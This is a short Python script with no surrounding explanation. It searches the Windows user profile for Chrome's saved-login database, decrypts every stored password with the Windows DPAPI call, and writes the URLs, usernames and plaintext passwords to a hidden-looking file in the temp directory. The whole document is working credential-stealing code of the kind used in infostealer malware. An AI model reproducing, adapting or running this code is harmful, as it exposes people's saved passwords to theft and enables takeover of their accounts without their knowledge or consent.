import os
import sqlite3
import win32crypt
import sys
import tempfile

TEMP_PATH = tempfile.gettempdir()
try:
    path = sys.argv[1]
except IndexError:
    for w in os.walk(os.getenv('USERPROFILE')):
        if 'Chrome' in w[1]:
            path = str(w[0]) + '\Chrome\User Data\Default\Login Data'

# Connect to the Database
try:
    conn = sqlite3.connect(path)
    cursor = conn.cursor()
except Exception, e:
    sys.exit(1)

# Get the results
try:
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
except Exception:
    sys.exit(1)

data = cursor.fetchall()

if len(data) > 0:
    GoogleAutoPassPath = TEMP_PATH + '//GoogleAutoPass'
    passGoogle = open(GoogleAutoPassPath,'w')
    for result in data:
        # Decrypt the Password
        try:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        except Exception:
            pass
        if password:
            passGoogle.write("[+] URL: %s \n    Username: %s \n    Password: %s \n" % (result[0], result[1], password))
    passGoogle.close()
else:
    sys.exit(0)